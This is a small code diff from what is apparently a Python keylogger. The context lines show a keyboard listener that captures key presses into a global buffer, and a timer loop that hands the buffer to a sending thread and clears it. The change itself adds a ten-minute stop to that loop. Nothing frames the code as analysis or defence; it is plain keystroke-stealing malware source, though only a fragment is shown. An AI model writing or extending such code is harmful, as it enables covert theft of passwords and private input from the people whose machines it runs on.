@@ -40,6 +40,9 @@ def chrono():
                 send_t.start()
                 #print(TXT_GLOB)
                 TXT_GLOB = ""
+            if seconds == 600 :
+                return 0
+
 def keylogger():
     with Listener(on_press=kpr) as listener:
         listener.join()
